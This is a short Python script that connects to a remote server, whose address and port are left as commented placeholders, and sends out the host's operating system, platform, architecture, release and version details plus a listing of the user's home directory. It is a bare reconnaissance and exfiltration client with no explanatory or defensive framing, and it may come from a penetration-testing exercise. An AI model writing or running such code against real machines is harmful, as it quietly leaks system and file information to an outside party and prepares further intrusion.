import os
import platform
import socket
import sys

#SRV_ADDR = <IP>
#SRV_PORT = <PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SRV_ADDR, SRV_PORT))

print('Connection is established!')

s.sendall(os.name.encode())
s.sendall(sys.platform.encode())
s.sendall( str(platform.machine()).encode())
s.sendall(str(platform.release()).encode())
s.sendall(str(platform.version()).encode())

files = str(os.listdir(os.getenv("HOME")))

s.sendall(files.encode())
